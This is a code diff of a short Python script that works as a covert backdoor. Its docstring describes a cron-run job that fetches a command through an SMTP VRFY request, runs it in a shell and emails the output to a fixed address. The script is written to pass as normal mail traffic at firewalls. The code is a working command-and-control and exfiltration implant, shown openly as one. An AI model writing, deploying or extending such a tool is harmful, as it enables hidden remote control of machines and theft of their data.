@@ -1,9 +1,12 @@
 '''
+Requirements:
+    Python 3.x with standard libraries
 The plan:
     This will keep getting run by cron or something
     Sends a VRFY request to get a command
     Sends an email with the output
 Ideally, this should look like normal SMTP traffic to any firewall... but it's not cool enough to do what DNS does
+It should also be compatible with Windows or *NIX
 '''
 import smtplib
 import socket
@@ -22,7 +25,7 @@ def main():
     emailAddr = username + "@" + machineIP
     command = connection.verify(emailAddr) #tuple of code and string response
     if(command[0] != 250):
-        exit(0) #Wait for next run
+        return #Wait for next run
     out = subprocess.Popen(command[1], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
     (stdout, stderr) = out.communicate()
     connection.sendmail(emailAddr, DEST_ADDR, stdout+"\n"+stderr)
